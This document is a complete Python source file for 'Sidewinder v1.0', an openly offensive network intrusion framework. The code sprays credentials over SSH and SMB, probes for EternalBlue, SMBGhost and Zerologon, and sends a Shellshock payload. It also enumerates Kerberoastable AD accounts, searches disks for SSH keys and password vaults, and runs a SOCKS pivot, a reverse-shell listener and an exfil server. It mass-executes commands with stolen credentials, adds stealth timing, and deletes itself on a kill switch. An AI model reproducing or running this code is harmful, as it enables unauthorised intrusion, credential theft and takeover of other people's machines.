import sys
import os
import argparse
import socket
import json
import threading
import time
import random
import ipaddress
import logging
import datetime
import subprocess
import struct
import select
import http.server
import socketserver
from concurrent.futures import ThreadPoolExecutor

# --- EXTERNAL DEPENDENCIES ---
try:
    import dns.resolver
    import paramiko
    import requests
    import urllib3
    from scapy.all import ARP, Ether, srp
    from ldap3 import Server, Connection, ALL, NTLM
    from ldap3.protocol.formatters.formatters import format_sid
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import nrpc, transport
    
    # Silence SSL Warnings
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"[-] Missing Dependency: {e}")
    print("[-] Run: pip install scapy ldap3 dnspython paramiko impacket requests")
    sys.exit(1)

# --- GLOBAL CONFIGURATION ---
logging.basicConfig(level=logging.ERROR)
findings_lock = threading.Lock()
ALL_FINDINGS = []
VALID_CREDS = []

# --- RISK DICTIONARIES ---
PIVOT_INFO = {
    # Infrastructure Ports
    22: {"service": "SSH", "risk": "SSH Tunneling", "tool": "ssh", "cmd_template": "ssh -D 9050 {user}@{ip}"},
    445: {"service": "SMB", "risk": "Lateral Movement", "tool": "impacket-psexec", "cmd_template": "impacket-psexec {domain}/{user}:{password}@{ip}"},
    3389: {"service": "RDP", "risk": "Remote Desktop", "tool": "xfreerdp", "cmd_template": "xfreerdp /u:{user} /p:{password} /v:{ip}"},
    5985: {"service": "WinRM", "risk": "Evil-WinRM", "tool": "evil-winrm", "cmd_template": "evil-winrm -i {ip} -u {user} -p {password}"},
    1080: {"service": "SOCKS", "risk": "Open Proxy", "tool": "proxychains", "cmd_template": "echo 'socks4 {ip} 1080' >> /etc/proxychains.conf"},
    # Web Ports
    80: {"service": "HTTP", "risk": "Web App", "tool": "curl", "cmd_template": "curl -I http://{ip}"},
    443: {"service": "HTTPS", "risk": "Web App", "tool": "curl", "cmd_template": "curl -k -I https://{ip}"},
    8080: {"service": "HTTP-Alt", "risk": "Web App", "tool": "curl", "cmd_template": "curl -I http://{ip}:8080"},
    8443: {"service": "HTTPS-Alt", "risk": "Web App", "tool": "curl", "cmd_template": "curl -k -I https://{ip}:8443"}
}

AD_VULN_INFO = {
    "kerberoast": {"title": "Kerberoasting", "risk": "Offline Cracking", "cmd_template": "hashcat -m 13100 hashes.kerberoast wordlist.txt"},
    "asrep": {"title": "AS-REP Roasting", "risk": "Pre-Auth Disabled", "cmd_template": "hashcat -m 18200 hashes.asrep wordlist.txt"}
}

# -------------------------------------------------------------------------
# MODULE 1: SECURITY & SELF DESTRUCT
# -------------------------------------------------------------------------
class SelfDestruct:
    def __init__(self):
        self.burn_date = "2026-01-01"
        self.kill_domain = "killswitch.sidewinder.local" 
        self.kill_signal = "KILL_SIDEWINDER"

    def check_should_die(self):
        if self._check_date() or self._check_dns_switch(): return True
        return False

    def _check_date(self):
        try: return datetime.date.today() > datetime.datetime.strptime(self.burn_date, "%Y-%m-%d").date()
        except: return False

    def _check_dns_switch(self):
        try:
            for rdata in dns.resolver.resolve(self.kill_domain, 'TXT'):
                if self.kill_signal in str(rdata): return True
        except: return False
        return False

    def implode(self):
        print(f"[!] SELF-DESTRUCT TRIGGERED.")
        if os.name == 'nt':
            subprocess.Popen(f'cmd /c "ping 127.0.0.1 -n 3 > nul & del {sys.argv[0]}"', shell=True)
        else:
            try: os.remove(sys.argv[0])
            except: pass
        sys.exit(0)

# -------------------------------------------------------------------------
# MODULE 2: PERSISTENCE (SOCKS & SNIFFER)
# -------------------------------------------------------------------------
class PassiveSniffer:
    def __init__(self): self.running = True
    def start(self):
        threading.Thread(target=self._listen_udp, args=(5355, "LLMNR"), daemon=True).start()
        threading.Thread(target=self._listen_udp, args=(137, "NBT-NS"), daemon=True).start()
        print("[*] Passive Sniffer active on UDP 5355 & 137")

    def _listen_udp(self, port, proto):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', port))
            while self.running:
                data, addr = sock.recvfrom(1024)
                if len(data) > 12:
                    # Naive extraction of Name Query
                    name = data[12:].split(b'\x00')[0].decode('utf-8','ignore').strip()
                    if len(name)>3: 
                        with findings_lock: print(f"\033[95m[~] {proto} POISON OPPORTUNITY: {addr[0]} asked for '{name}'\033[0m")
        except: pass

class SocksProxy:
    def __init__(self, port=9050): self.port = port; self.running = True
    def start(self):
        threading.Thread(target=self._run_server, daemon=True).start()
        print(f"[*] SOCKS4 Proxy listening on 0.0.0.0:{self.port}")

    def _run_server(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind(('0.0.0.0', self.port)); server.listen(10)
            while self.running:
                client, addr = server.accept()
                threading.Thread(target=self._handle_client, args=(client,)).start()
        except: pass

    def _handle_client(self, client):
        try:
            data = client.recv(9)
            if len(data)<9 or data[0]!=4: client.close(); return
            dst_ip = socket.inet_ntoa(data[4:8]); dst_port = struct.unpack("!H", data[2:4])[0]
            remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            remote.connect((dst_ip, dst_port))
            client.send(b"\x00\x5a" + data[2:8])
            self._exchange(client, remote)
        except: client.close()

    def _exchange(self, c, r):
        while True:
            rd, _, _ = select.select([c, r], [], [])
            if c in rd:
                d = c.recv(4096)
                if not d: break
                r.send(d)
            if r in rd:
                d = r.recv(4096)
                if not d: break
                c.send(d)
        c.close(); r.close()

# -------------------------------------------------------------------------
# MODULE 3: POST-EXPLOITATION (LOOT, LISTEN, EXFIL)
# -------------------------------------------------------------------------
class LootHunter:
    def __init__(self, search_path=None):
        self.search_path = search_path if search_path else ("C:\\Users" if os.name == 'nt' else "/home")
        self.targets = ['id_rsa', 'id_dsa', '.pem', '.kdbx', 'keepass', 'web.config', '.env', 'unattend.xml']

    def hunt(self):
        print(f"[*] HUNTING LOOT in: {self.search_path}")
        count = 0
        try:
            for root, dirs, files in os.walk(self.search_path):
                for file in files:
                    if any(t in file.lower() for t in self.targets):
                        print(f"\033[93m[!] LOOT FOUND: {os.path.join(root, file)}\033[0m")
                        count += 1
        except Exception: pass
        print(f"[*] Hunt Complete. Artifacts: {count}")

class ExfilServer:
    def __init__(self, port): self.port = port
    def start(self):
        Handler = http.server.SimpleHTTPRequestHandler
        print(f"[*] EXFIL SERVER on 0.0.0.0:{self.port} (Serving current dir)")
        socketserver.TCPServer.allow_reuse_address = True
        with socketserver.TCPServer(("", self.port), Handler) as httpd:
            try: httpd.serve_forever()
            except: pass

class ShellListener:
    def __init__(self, port): self.port = port
    def start(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', self.port)); s.listen(1)
        print(f"[*] LISTENING on {self.port}..."); c, a = s.accept()
        print(f"\033[92m[+] SHELL from {a[0]}!\033[0m")
        
        # PTY Spawn Attempt
        c.send(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"); time.sleep(1)
        
        # Interactive Loop
        stop = threading.Event()
        def reader():
            while not stop.is_set():
                try: 
                    d = c.recv(4096)
                    if not d: stop.set(); break
                    sys.stdout.write(d.decode(errors='ignore')); sys.stdout.flush()
                except: stop.set(); break
        threading.Thread(target=reader, daemon=True).start()
        
        while not stop.is_set():
            try: c.send(sys.stdin.readline().encode())
            except: stop.set()
        c.close()

# -------------------------------------------------------------------------
# MODULE 4: VULNERABILITY & EXPLOIT HUNTER
# -------------------------------------------------------------------------
def check_windows_vulns(ip):
    findings = []
    # MS17-010 (EternalBlue)
    try:
        smb = SMBConnection(ip, ip, timeout=2); smb.login('','')
        if smb.getDialect() == getattr(SMBConnection, 'SMB_DIALECT_NT1', 0):
            if "Windows 7" in smb.getServerOS() or "2008" in smb.getServerOS(): findings.append("MS17-010 (EternalBlue) Candidate")
    except: pass
    
    # SMBGhost (SMBv3 Compression)
    try:
        smb = SMBConnection(ip, ip, timeout=2); smb.login('','')
        if smb.getDialect() == getattr(SMBConnection, 'SMB_DIALECT_311', 0x0311): findings.append("SMBv3.1.1 (Check for SMBGhost)")
    except: pass

    # Zerologon (Pipe check)
    try:
        binding = r'ncacn_np:{}[\PIPE\netlogon]'.format(ip)
        rpctransport = transport.DCERPCTransportFactory(binding)
        dce = rpctransport.get_dce_rpc(); dce.connect(); dce.bind(nrpc.MSRPC_UUID_NRPC)
        findings.append("Netlogon Pipe Exposed (Check for Zerologon)")
    except: pass
    return findings

class WebExploiter:
    def __init__(self, ip, port, ssl=False):
        self.base_url = f"{'https' if ssl else 'http'}://{ip}:{port}"
    
    def run_checks(self):
        v = []
        if self._check_shellshock(): v.append("Shellshock (CVE-2014-6271)")
        # if self._check_struts(): v.append("Apache Struts (CVE-2017-5638)")
        return v
        
    def _check_shellshock(self):
        try:
            h = {'User-Agent': "() { :;}; echo; echo 'VULN_SIDEWINDER';"}
            r = requests.get(self.base_url, headers=h, timeout=2, verify=False)
            if "VULN_SIDEWINDER" in r.text: return True
        except: pass
        return False

# -------------------------------------------------------------------------
# MODULE 5: RECON & SPRAY
# -------------------------------------------------------------------------
class CredentialSprayer:
    def __init__(self, u, p, d=""): self.u=u; self.p=p; self.d=d
    def check_ssh(self, i):
        try:
            c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(i, port=22, username=self.u, password=self.p, timeout=3); c.close(); return True
        except: return False
    def check_smb(self, i):
        try:
            s=SMBConnection(i,i,timeout=3)
            if s.login(self.u, self.p, self.d):
                a=False; 
                try: s.connectTree("ADMIN$"); a=True
                except: pass
                s.logoff(); return True, a
            return False, False
        except: return False, False

def grab_web_info(ip, port):
    try:
        res = requests.get(f"{'https' if port in [443,8443] else 'http'}://{ip}:{port}", timeout=2, verify=False)
        server = res.headers.get('Server', 'Unk'); title = "No Title"
        if "<title>" in res.text.lower():
            title = res.text.split('<title>')[1].split('</title>')[0][:50]
        return f"WEB INTEL: Title='{title}' | Server='{server}'"
    except: return None

def scan_host_worker(info, sprayer=None, user=None, password=None, domain="", stealth=False, vuln_check=False):
    ip = info['ip']
    if stealth: time.sleep(random.uniform(0.5, 2.5))

    # Vulnerability Scanning
    if vuln_check:
        for v in check_windows_vulns(ip):
            with findings_lock: print(f"\033[91m[!] {ip} -> {v}\033[0m")
        
        # Web Exploits
        for wp in [80, 443, 8080]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1); res = s.connect_ex((ip, wp)); s.close()
                if res == 0:
                    we = WebExploiter(ip, wp, ssl=(wp==443))
                    for v in we.run_checks():
                        with findings_lock: print(f"\033[91m[!] WEB VULN: {ip}:{wp} -> {v}\033[0m")
            except: pass

    # Port Scanning
    for port, meta in PIVOT_INFO.items():
        try:
            s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(1.0 if stealth else 0.5)
            if s.connect_ex((ip, port))==0:
                s.close(); extra=""
                if port in [80,443,8080]: extra = grab_web_info(ip, port)
                with findings_lock:
                    if extra: print(f"\033[96m[*] {ip}:{port} -> {extra}\033[0m")
                    else: print(f"[*] OPEN: {ip}:{port} ({meta['service']})")
                    ALL_FINDINGS.append({'type':'network','ip':ip,'port':port})
                
                # Spray Logic
                if sprayer and port in [22,445]:
                    ok=False; acc=""
                    if port==22 and sprayer.check_ssh(ip): ok=True; acc="Shell"
                    elif port==445:
                        ok, adm = sprayer.check_smb(ip)
                        if ok: acc="Admin" if adm else "Read"
                    if ok:
                        with findings_lock: 
                            print(f"\033[92m[+] PWNED: {ip} ({acc})\033[0m")
                            VALID_CREDS.append({'ip':ip,'service':meta['service'],'user':user,'pass':password,'access':acc})
        except: pass

def get_targets(sub, stealth):
    if stealth:
        net = ipaddress.ip_network(sub, strict=False)
        h = [{'ip':str(i)} for i in net.hosts()]; random.shuffle(h); return h
    else:
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=sub), timeout=2, verbose=0)[0]
        return [{'ip': r.psrc} for s, r in ans]

# -------------------------------------------------------------------------
# MODULE 6: REPORTING & AD & EXEC
# -------------------------------------------------------------------------
def run_ad(dom, u, p):
    try:
        srv = f"_ldap._tcp.dc._msdcs.{dom}"
        target = str(dns.resolver.resolve(srv, 'SRV')[0].target).rstrip('.')
        ip = str(dns.resolver.resolve(target, 'A')[0])
        s = Server(ip, get_info=ALL); c = Connection(s, user=f"{dom}\\{u}", password=p, authentication=NTLM)
        if c.bind():
            print(f"[*] Scanning AD: {dom}")
            c.search(s.info.other['defaultNamingContext'][0], "(objectClass=user)", attributes=['sAMAccountName','servicePrincipalName','userAccountControl','objectSid'])
            bh=[]
            for e in c.entries:
                if e.servicePrincipalName: 
                    ALL_FINDINGS.append({'type':'ad','vuln_type':'kerberoast','user':e.sAMAccountName.value})
                    print(f"[!] Kerberoast: {e.sAMAccountName.value}")
                bh.append({"ObjectIdentifier": format_sid(e.objectSid.value), "Properties": {"name":e.sAMAccountName.value}})
            with open(f"{dom}_users.json", "w") as f: json.dump({"data":bh, "meta":{"type":"users","version":4}}, f)
    except: pass

class CheatSheetGenerator:
    def generate(self, findings):
        with open("sidewinder_cheatsheet.txt", "w") as f:
            f.write("SIDEWINDER BATTLE PLAN\n" + "="*30 + "\n")
            for i in findings:
                if i['type']=='network': f.write(f"TARGET: {i['ip']} ({i['port']})\n")
                elif i['type']=='ad': f.write(f"AD VULN: {i['vuln_type']} ({i['user']})\n")
        print("[+] Plan Saved.")

class MassExecutor:
    def __init__(self, cmd): self.cmd=cmd; self.smb=[]
    def run(self, loot):
        print(f"[*] EXEC: {self.cmd}")
        with ThreadPoolExecutor(max_workers=10) as ex:
            for t in loot:
                if t['service']=='SSH': ex.submit(self._ssh, t)
                elif t['service']=='SMB': self.smb.append(t)
        if self.smb: self._batch()
    def _ssh(self, t):
        try:
            c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            c.connect(t['ip'], port=22, username=t['user'], password=t['pass'], timeout=5)
            out = c.exec_command(self.cmd)[1].read().decode().strip()
            print(f"\n[+] SSH {t['ip']}:\n{out}")
        except: pass
    def _batch(self):
        with open("mass_smb.bat","w") as f:
            for t in self.smb: f.write(f"impacket-psexec {t['user']}:{t['pass']}@{t['ip']} \"{self.cmd}\"\n")
        print("[+] SMB Batch Generated.")

# -------------------------------------------------------------------------
# MAIN
# -------------------------------------------------------------------------
def main():
    if SelfDestruct().check_should_die(): SelfDestruct().implode()
    print(r"""
   _____________  ________      ________   _____  ____________ 
  / __/  _/ _ \ \/ / __/ | /| / /  _/ | / / _ \/ __/ _ \
 _\ \_/ // // /\  / _/ | |/ |/ // //    / // / _// , _/
/___/___/____/ /_/___/ |__/|__/___/_/|_/____/___/_/|_| 

   [ SIDEWINDER v1.0 ] :: The Complete Framework
   Author: https://github.com/z-tejani
    """)
    parser = argparse.ArgumentParser()
    # Recon Args
    parser.add_argument("--subnet", help="Scan Network (e.g., 192.168.1.0/24)")
    parser.add_argument("--domain", help="Scan AD Domain")
    parser.add_argument("--stealth", action="store_true", help="Enable Evasion Mode")
    
    # Auth Args
    parser.add_argument("--user"); parser.add_argument("--password")
    
    # Modes
    parser.add_argument("--exec", help="Mass Command Execution")
    parser.add_argument("--sniff", action="store_true", help="Passive Sniffer")
    parser.add_argument("--socks", action="store_true", help="SOCKS Proxy")
    parser.add_argument("--vuln", action="store_true", help="Exploit Hunter")
    parser.add_argument("--hunt", action="store_true", help="Loot Hunter")
    parser.add_argument("--listen", type=int, help="Shell Listener [PORT]")
    parser.add_argument("--exfil", type=int, help="Exfil Server [PORT]")
    parser.add_argument("--threads", type=int, default=20)
    
    args = parser.parse_args()

    # Exclusive Modes
    if args.listen: ShellListener(args.listen).start(); sys.exit(0)
    if args.exfil: ExfilServer(args.exfil).start(); sys.exit(0)

    # Background Services
    if args.socks: SocksProxy().start()
    if args.sniff: PassiveSniffer().start()
    
    # Task
    if args.hunt: LootHunter().hunt()

    # Network Ops
    if args.subnet:
        h = get_targets(args.subnet, args.stealth)
        sp = CredentialSprayer(args.user, args.password) if args.user else None
        print(f"[*] Scanning {len(h)} hosts...")
        with ThreadPoolExecutor(max_workers=5 if args.stealth else args.threads) as ex:
            for i in h: ex.submit(scan_host_worker, i, sp, args.user, args.password, "", args.stealth, args.vuln)

    # AD Ops
    if args.domain: run_ad(args.domain, args.user, args.password)

    # Post Ops
    if ALL_FINDINGS: CheatSheetGenerator().generate(ALL_FINDINGS)
    if VALID_CREDS:
        with open("pwned_targets.txt", "w") as f:
            for i in VALID_CREDS: f.write(f"{i['service']}://{i['user']}:{i['pass']}@{i['ip']} # {i['access']}\n")
        print("[+] Loot Saved.")
        if args.exec: MassExecutor(args.exec).run(VALID_CREDS)
    
    # Keep alive if background tasks only
    if (args.sniff or args.socks) and not (args.subnet or args.domain):
        try: 
            while True: time.sleep(1)
        except KeyboardInterrupt: pass

    print("\n[*] Sidewinder v1.0 Complete.")

if __name__ == "__main__":
    main()